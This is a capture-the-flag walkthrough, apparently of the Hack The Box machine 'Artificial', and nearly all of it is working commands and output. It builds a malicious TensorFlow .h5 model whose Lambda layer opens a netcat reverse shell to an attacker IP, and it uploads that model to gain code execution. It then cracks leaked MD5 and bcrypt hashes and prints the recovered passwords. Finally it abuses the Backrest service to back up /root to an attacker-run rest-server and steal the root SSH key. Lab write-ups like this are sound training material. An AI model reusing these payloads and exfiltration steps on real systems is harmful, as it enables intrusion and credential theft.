## user.txt

```
pyenv install python3.8.20
pyenv virtualenv 3.8.20 tooling3.8.20
pyenv activate tooling3.8.20

nano ~/borrar/Dockerfile
```

We read the site at: `view-source:http://artificial.htb/static/Dockerfile`

```
FROM python:3.8-slim

WORKDIR /code

RUN apt-get update && \
    apt-get install -y curl && \
    curl -k -LO https://files.pythonhosted.org/packages/65/ad/4e090ca3b4de53404df9d1247c8a371346737862cfe539e7516fd23149a4/tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl && \
    rm -rf /var/lib/apt/lists/*

RUN pip install ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl

ENTRYPOINT ["/bin/bash"]
```

We create a Dockerfile with those contents:

```
nano ~/borrar/Dockerfile
```

Then we build the Docker image:

```
docker build -t my-tf-image .
```

And run the container:

```
docker run -it --rm my-tf-image
```

We land in a bash shell at `/code`:

```
root@09d68e2c2a65:/code#
```

We exit the container and create the exploit:

```
nano exploit_gen.py
```

With the following content:

```
import tensorflow as tf

def exploit(x):
    import os
    os.system("rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.112 1234 > /tmp/f")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("exploit.h5")
```

Run the container again, this time mounting the file into it:

```
docker run -it --name mycontainer -v ~/borrar/exploit_gen.py:/code/exploit_gen.py my-tf-image
```

Inside the container:

```
root@46a37b8786c4:/code# python3 exploit_gen.py
```

Output notes:

- TensorFlow loads successfully.
- Warning: `nc` is not found, but the file `exploit.h5` is created successfully.
    

```
root@46a37b8786c4:/code# exit
```

Back on the **host** (not inside Docker):

```
docker cp mycontainer:/code/exploit.h5 ~/borrar/exploit.h5
```

Now the payload is saved to `~/borrar/exploit.h5`.

Set up a listener:

```
nc -lnvp 1234
```

Upload the `.h5` file to the target:

```
POST /upload_model HTTP/1.1
...
Content-Disposition: form-data; name="model_file"; filename="exploit.h5"
Content-Type: application/octet-stream

[SNIPPED]
...
```

Click on "View prediction" and we receive a reverse shell.

Spawn a proper shell:

```
python3 -c "import pty;pty.spawn('/bin/bash')"
```

We land in:

```
/home/app/app
```

Inside `~/app/instance` we find `users.db`:

```
cp instance/users.db static/users.db
```

Download the file to Kali and inspect it:

```
sqlite3 users.db
sqlite> .tables
sqlite> SELECT * FROM user;
```

Hash for `gael`:

```
echo "c99175974b6e192936d97224638a34f8" > hash.txt
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt --force
```

Cracked:

```
Gael:mattp005numbertwo
```

SSH into the box:

```
ssh gael@10.129.188.125
```

Retrieve the user flag:

```
cat /home/gael/user.txt
```

## root.txt

Check groups:

```
id
```

Output:

```
group=sysadm
```

Find files belonging to the `sysadm` group:

```
find / -group sysadm -ls 2>/dev/null
```

Found:

```
/var/backups/backrest_backup.tar.gz
```

Copy and extract:

```
cp /var/backups/backrest_backup.tar.gz /tmp/
cd /tmp/
tar -xvf backrest_backup.tar.gz
```

Inspect `config.json`:

```
cat backrest/.config/backrest/config.json
```

Extract bcrypt password:

```
echo 'JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP' | base64 -d
```

Result:

```
$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO
```

Crack:

```
echo '$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO' > artificial.txt
hashcat -m 3200 artificial.txt /usr/share/wordlists/rockyou.txt
```

Cracked:

```
!@#$%^
```

Check if `backrest` is running:

```
netstat -tulnp | grep LISTEN
```

It is listening on:

```
tcp 0 0 127.0.0.1:9898 0.0.0.0:* LISTEN - 
tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN - 
tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN - 
tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - 
tcp 0 0 127.0.0.1:5000 0.0.0.0:* LISTEN - 
tcp6 0 0 :::80 :::* LISTEN - tcp6 0 0 :::22
```

Test login:

```
curl -i -u backrest_root:'!@#$%^' http://127.0.0.1:9898/
```

Tunnel the service:

```
ssh gael@10.129.188.125 -L 9898:127.0.0.1:9898
```

Open browser at `http://127.0.0.1:9898`

We login with `backrest_root:!@#$%^`

From GUI, we create a repo and use the feature to run custom `restic` commands.

Now, we install and run a local `rest-server` in our kali machine:

```
sudo apt install restic -y
mkdir -p ~/tools/rest-server
wget https://github.com/restic/rest-server/releases/download/v0.14.0/rest-server-0.14.0.tar.gz
go build -o rest-server ./cmd/rest-server
mkdir -p /tmp/restic-data
./rest-server --path /tmp/restic-data --listen :12345 --no-auth
```

From the app GUI at `http://127.0.0.1:9898`, in the created repo there is an option for running commands. We enter:

```
-r rest:http://10.10.14.112:12345/myrepo init
-r rest:http://10.10.14.112:12345/myrepo backup /root
```

Now from kali, we observe in our rest-server the we are receiving this:

```
Creating repository directories in /tmp/restic-data/myrepo
```

From  Kali, we can check now the existing snapshots in the created repo:

```
restic -r /tmp/restic-data/myrepo snapshots
```

Output:

```
enter password for repository: 
repository c4d8f1d0 opened (version 2, compression level auto)
created new cache in /root/.cache/restic
ID        Time                 Host        Tags        Paths  Size
-----------------------------------------------------------------------
7603045e  2025-07-13 23:51:32  artificial              /root  4.299 MiB
-----------------------------------------------------------------------
1 snapshots

```

Now we can restore that snapshot that will mimic the /root folder:

```
restic -r /tmp/restic-data/myrepo restore 7603045e --target /tmp/restic-data/restore
```

And we can access the restored root folder in out kali:

```
cd /tmp/restic-data/restore/root
```

Retrieve root flag and private key:

```
cat root.txt
cat ./ssh/id_rsa
chmod 600 id_rsa
ssh -i id_rsa root@$ip
```